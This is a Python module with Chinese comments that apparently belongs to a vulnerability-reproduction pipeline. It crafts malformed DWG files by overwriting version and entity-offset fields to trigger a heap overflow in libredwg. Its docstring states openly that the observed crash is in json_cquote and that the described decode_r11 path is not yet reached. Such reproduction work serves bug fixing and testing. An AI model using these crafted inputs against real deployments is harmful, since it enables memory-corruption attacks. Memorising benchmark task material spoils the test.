"""CG-10（arvo:54625 / libredwg）DWG 输入构造器。

**缺陷（描述口径）**：`decode_r11` 里 `entities_end` 会溢出——
`src/decode_r11.c:697` 从文件读 `entities_end`，随后
`decode_preR13_entities (entities_start, entities_end, num_entities,
entities_end - entities_start, 0, dat, dwg)`（同文件 :819）用"末尾 - 起点"
算长度；entities_end 可被文件内容推到远大于真实数据区，长度与真实缓冲脱钩。

**本构造器实际测到的行为（不美化）**：
1. 以 `agent/templates/dwg_base.bin`（头部 `AC1001`）为底、只改版本字节
   （文件偏移 0x4B = 75）时，vul 镜像稳定 ASAN 崩溃，但崩溃点是
   `json_cquote` / `header_variables_r11.spec:145`（out_json.c 的写出路径，
   1 字节堆越界，CWE-122），**不是**描述里的 decode_r11；
   fix 镜像同一输入 exit=0。
2. 把版本改成 `AC1009`（R11）后 `SINCE(R_2_0b)` 分支才会读
   entities_start(0x14)/entities_end(0x18)；用仓库内
   `test/test-data/r11/entities-3d.dwg` 把 0x18 改 0x7FFFFFFF，
   vul/fix 都是 exit=0 —— 该 patch 没把溢出打到 ASAN 可判的位置。
   所以"描述的那条路径"**尚未构造成功**，本模块不声称已触发它。

**来源声明**：底料来自仓库自带模板与自带测试数据，不是模型从描述推导；
若它让流水线通过，只算"选中/拼接了参数"，不算模型自主发现。
"""
from __future__ import annotations

from pathlib import Path

DEFAULT_TEMPLATE = "dwg_base.bin"
VERSION_OFFSET = 0x4B          # 模板里版本字节所在偏移（已有构造器同口径）
ENTITIES_START_OFF = 0x14      # decode_preR13 的 RL 起点（R_2_0b 及以上）
ENTITIES_END_OFF = 0x18
BLOCKS_START_OFF = 0x1C

FIELD_SPEC = {
    "base": "'template'(默认, AC1001) | 'r11'(仓库 test-data/r11 样本, AC1009)",
    "version": "int(1..5), 写进偏移 0x4B 的版本字节",
    "entities_start": "int|None, 覆盖 0x14 的 RL",
    "entities_end": "int|None, 覆盖 0x18 的 RL（描述里的溢出字段）",
    "blocks_start": "int|None, 覆盖 0x1C 的 RL",
    "tail_repeat": "int(1..64), 末尾重复次数（用于撑大输入）",
}

R11_DIR = "test/test-data/r11"
R11_SAMPLE = "entities-3d.dwg"

# 描述口径的缺陷点（源码实测行号，不是猜的）
DECLARED_SINK = {
    "file": "src/decode_r11.c",
    "line": 819,
    "symbol": "decode_preR13_entities",
    "note": "entities_end - entities_start 作为长度传入；entities_end 来自 :697 的文件读取",
}
# 实测落到的崩溃点（模板 + version 路径）
OBSERVED_CRASH = {
    "file": "src/out_json.c",
    "line": 1865,
    "symbol": "json_cquote",
    "note": "经 header_variables_r11.spec:145 进入；与描述缺陷不同",
}


class LibredwgResult:
    """构造结果（普通类：本模块可能按文件路径动态加载）。"""

    def __init__(self, ok, data=b"", fields_used=None, dropped=None, reason=""):
        self.ok = ok
        self.data = data
        self.format = "dwg"
        self.fields_used = dict(fields_used or {})
        self.dropped = list(dropped or [])
        self.reason = reason

    @property
    def size(self) -> int:
        return len(self.data)

    def to_record(self) -> dict:
        return {"ok": self.ok, "format": self.format, "size": self.size,
                "fields_used": self.fields_used, "dropped_fields": self.dropped,
                "reason": self.reason}


def _template_path() -> Path:
    return Path(__file__).resolve().parent.parent / "templates" / DEFAULT_TEMPLATE


def _r11_path(ws: Path | None = None) -> Path:
    base = Path(ws) if ws else None
    if base is None:
        raise FileNotFoundError("r11 底料需要显式给出 src 根目录")
    return base / "libredwg" / R11_DIR / R11_SAMPLE


def build(fields: dict, *, src_root: Path | str | None = None) -> LibredwgResult:
    """按字段拼一个 DWG 输入。字段不认识就丢掉并记录，不静默忽略。"""
    fields = dict(fields or {})
    base = str(fields.get("base") or "template")
    if base == "template":
        try:
            data = bytearray(_template_path().read_bytes())
        except OSError as exc:
            return LibredwgResult(False, reason=f"模板缺失: {exc}")
    elif base == "r11":
        try:
            data = bytearray(_r11_path(src_root).read_bytes())
        except (OSError, FileNotFoundError) as exc:
            return LibredwgResult(False, reason=f"r11 底料不可用: {exc}")
    else:
        return LibredwgResult(False, reason=f"base 只认 template/r11: {base}")

    used: dict = {"base": base}
    dropped: list = []

    if "version" in fields and fields["version"] is not None:
        try:
            ver = int(fields["version"])
        except (TypeError, ValueError):
            return LibredwgResult(False, reason="version 不是整数")
        if not 1 <= ver <= 5:
            return LibredwgResult(False, reason=f"version 越界（1..5）: {ver}")
        data[VERSION_OFFSET] = ver
        used["version"] = ver

    for key, off in (("entities_start", ENTITIES_START_OFF),
                     ("entities_end", ENTITIES_END_OFF),
                     ("blocks_start", BLOCKS_START_OFF)):
        val = fields.get(key)
        if val is None:
            continue
        try:
            num = int(val)
        except (TypeError, ValueError):
            return LibredwgResult(False, reason=f"{key} 不是整数")
        if not 0 <= num <= 0xFFFFFFFF:
            return LibredwgResult(False, reason=f"{key} 越界（0..2^32-1）: {num}")
        if off + 4 > len(data):
            return LibredwgResult(False, reason=f"底料太短，写不进 {key}@{hex(off)}")
        data[off:off + 4] = num.to_bytes(4, "little")
        used[key] = num

    if "tail_repeat" in fields and fields["tail_repeat"] is not None:
        try:
            rep = int(fields["tail_repeat"])
        except (TypeError, ValueError):
            return LibredwgResult(False, reason="tail_repeat 不是整数")
        if not 1 <= rep <= 64:
            return LibredwgResult(False, reason=f"tail_repeat 越界（1..64）: {rep}")
        data = data * rep
        used["tail_repeat"] = rep

    known = set(FIELD_SPEC)
    for k in fields:
        if k not in known:
            dropped.append({"field": k, "reason": "libredwg 构造器不识别该字段"})
    return LibredwgResult(True, bytes(data), used, dropped, "")


def declared_claim() -> dict:
    """描述口径的缺陷声明（供 verify 记录用；与实测崩溃点分开写，不混淆）。"""
    return {
        "subject": "decode_r11",
        "cwe": "CWE-122",
        "sink": dict(DECLARED_SINK),
        "observed_crash": dict(OBSERVED_CRASH),
        "evidence_source": "description.txt + src/decode_r11.c",
        "proposed_by": "rule",
        "verified": False,
        "note": "构造器能拼出输入，但描述口径的 decode_r11 路径尚未实测触发",
    }


def fields_spec() -> dict:
    return dict(FIELD_SPEC)
